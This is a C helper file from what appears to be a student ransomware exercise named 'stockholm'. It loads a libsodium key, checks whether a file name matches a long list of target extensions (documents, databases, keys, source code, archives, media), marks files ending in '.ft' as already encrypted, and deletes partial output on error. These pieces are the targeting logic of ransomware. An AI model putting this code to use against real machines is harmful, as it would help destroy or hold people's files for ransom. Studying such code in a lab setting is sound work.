/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   helper.c                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: hoannguy <hoannguy@student.42lausanne.c    +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/06/24 18:01:14 by hoannguy          #+#    #+#             */
/*   Updated: 2026/06/28 16:37:33 by hoannguy         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "stockholm.h"

unsigned char *load_key(char *arg, bool s_flag) {
	char			hex[KEY_LEN * 2 + 2];
	char			*hex_str;
	unsigned char	*key;
	FILE			*file;

	hex_str = arg;
	file = fopen(arg, "r");
	if (file) {
		if (!fgets(hex, sizeof(hex), file)) {
			if (!s_flag)
				fprintf(stderr, "Error: cannot read key from %s\n", arg);
			fclose(file);
			return NULL;
		}
		fclose(file);
		hex[strcspn(hex, "\n")] = '\0';
		hex_str = hex;
	}

	if (strlen(hex_str) != KEY_LEN * 2) {
		if (!s_flag)
			fprintf(stderr, "Error: key must be exactly %d hex characters\n", KEY_LEN * 2);
		return NULL;
	}
	
	key = malloc(KEY_LEN);
	if (!key) {
		if (!s_flag)
			fprintf(stderr, "Error: malloc failed\n");
		return NULL;
	}
	
	if (sodium_hex2bin(key, KEY_LEN, hex_str,
			KEY_LEN * 2, NULL, NULL, NULL) != 0) {
		if (!s_flag)
			fprintf(stderr, "Error: invalid key format\n");
		free(key);
		return NULL;
	}
	
	return key;
}

bool is_affected_extension(char *file_name) {
	char	*affected_ext[] = {
			".der",
			".pfx",
			".key",
			".crt",
			".csr",
			".p12",
			".pem",
			".odt",
			".ott",
			".sxw",
			".stw",
			".uot",
			".3ds",
			".max",
			".3dm",
			".ods",
			".ots",
			".sxc",
			".stc",
			".dif",
			".slk",
			".wb2",
			".odp",
			".otp",
			".sxd",
			".std",
			".uop",
			".odg",
			".otg",
			".sxm",
			".mml",
			".lay",
			".lay6",
			".asc",
			".sqlite3",
			".sqlitedb",
			".sql",
			".accdb",
			".mdb",
			".db",
			".dbf",
			".odb",
			".frm",
			".myd",
			".myi",
			".ibd",
			".mdf",
			".ldf",
			".sln",
			".suo",
			".cs",
			".c",
			".cpp",
			".pas",
			".h",
			".asm",
			".js",
			".cmd",
			".bat",
			".ps1",
			".vbs",
			".vb",
			".pl",
			".dip",
			".dch",
			".sch",
			".brd",
			".jsp",
			".php",
			".asp",
			".rb",
			".java",
			".jar",
			".class",
			".sh",
			".mp3",
			".wav",
			".swf",
			".fla",
			".wmv",
			".mpg",
			".vob",
			".mpeg",
			".asf",
			".avi",
			".mov",
			".mp4",
			".3gp",
			".mkv",
			".3g2",
			".flv",
			".wma",
			".mid",
			".m3u",
			".m4u",
			".djvu",
			".svg",
			".ai",
			".psd",
			".nef",
			".tiff",
			".tif",
			".cgm",
			".raw",
			".gif",
			".png",
			".bmp",
			".jpg",
			".jpeg",
			".vcd",
			".iso",
			".backup",
			".zip",
			".rar",
			".7z",
			".gz",
			".tgz",
			".tar",
			".bak",
			".tbk",
			".bz2",
			".PAQ",
			".ARC",
			".paq",
			".arc",
			".aes",
			".gpg",
			".vmx",
			".vmdk",
			".vdi",
			".sldm",
			".sldx",
			".sti",
			".sxi",
			".602",
			".hwp",
			".snt",
			".onetoc2",
			".dwg",
			".pdf",
			".wk1",
			".wks",
			".123",
			".rtf",
			".csv",
			".txt",
			".vsdx",
			".vsd",
			".edb",
			".eml",
			".msg",
			".ost",
			".pst",
			".potm",
			".potx",
			".ppam",
			".ppsx",
			".ppsm",
			".pps",
			".pot",
			".pptm",
			".pptx",
			".ppt",
			".xltm",
			".xltx",
			".xlc",
			".xlm",
			".xlt",
			".xlw",
			".xlsb",
			".xlsm",
			".xlsx",
			".xls",
			".dotx",
			".dotm",
			".dot",
			".docm",
			".docb",
			".docx",
			".doc",
			0
		};
	int		i = 0;
	char	*ext;

	ext = strrchr(file_name, '.');
	if (ext == NULL)
		return false;
	while (affected_ext[i] != 0) {
		if (strcmp(ext, affected_ext[i]) == 0)
			return true;
		i++;
	}
	return false;
}

bool is_encrypted(char *file_name) {
	char	*ext;

	ext = strrchr(file_name, '.');
	if (ext == NULL)
		return false;
	return strcmp(ext, ".ft") == 0 ? true : false;
}

void clean_up(FILE *target, FILE *source, char *target_file) {
	fclose(target);
	fclose(source);
	remove(target_file);
}
